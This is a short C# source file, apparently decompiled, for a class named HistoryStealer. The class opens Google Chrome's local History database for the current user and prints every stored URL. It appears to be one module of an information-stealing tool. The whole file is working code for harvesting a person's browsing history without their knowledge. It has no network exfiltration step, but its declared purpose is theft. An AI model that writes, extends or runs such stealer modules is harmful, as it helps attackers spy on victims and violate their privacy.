using System;
using System.Data.SQLite;

namespace Modules
{
	// Token: 0x02000013 RID: 19
	public class HistoryStealer
	{
		// Token: 0x0600001F RID: 31 RVA: 0x0000392C File Offset: 0x00001B2C
		public void Run()
		{
			Console.WriteLine("[+] Executing History");
			string text = Environment.GetEnvironmentVariable("localappdata") + "\\Google\\Chrome\\User Data" + "\\Default\\History";
			SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + text + ";Version=3;");
			sqliteConnection.Open();
			SQLiteDataReader sqliteDataReader = new SQLiteCommand("SELECT url FROM urls", sqliteConnection).ExecuteReader();
			while (sqliteDataReader.Read())
			{
				Console.WriteLine(sqliteDataReader["url"].ToString());
			}
		}
	}
}
